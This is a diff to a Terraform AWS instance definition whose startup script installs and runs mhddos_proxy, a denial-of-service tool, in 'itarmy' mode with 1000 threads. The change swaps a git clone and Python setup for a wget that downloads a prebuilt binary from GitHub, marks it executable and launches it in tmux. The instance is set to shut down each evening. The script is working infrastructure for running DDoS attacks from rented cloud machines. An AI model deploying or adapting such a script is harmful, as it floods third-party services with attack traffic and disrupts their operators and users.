@@ -68,18 +68,14 @@ resource "aws_instance" "itarmy" {
 
     #!/usr/bin/env bash
     apt update
-    apt install -y python3.10-venv
     timedatectl set-timezone Europe/Kiev
     shutdown -P 19:00 --no-wall
     su - ubuntu << EOF
-    python3 -m venv ~/venv
-    git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy ~/mhddos_proxy
+    mkdir -p ~/bin
+    wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux -O ~/bin/mhddos_proxy_linux && chmod 755 ~/bin/mhddos_proxy_linux
     tmux new -ds itarmy
-    tmux send 'source ~/venv/bin/activate' Enter
-    tmux send 'pip install --no-cache-dir -r ~/mhddos_proxy/requirements.txt' Enter
-    tmux send 'cd ~/mhddos_proxy' Enter
-    tmux send 'python3 runner.py --itarmy -t 1000' Enter
-    echo -e '"\\e[A": history-search-backward\n"\\e[B": history-search-forward' > .inputrc
+    tmux send 'mhddos_proxy_linux --itarmy -t 1000' Enter
+    echo -e '"\\e[A": history-search-backward\n"\\e[B": history-search-forward' > ~/.inputrc
     EOF
     --//--
   EOT
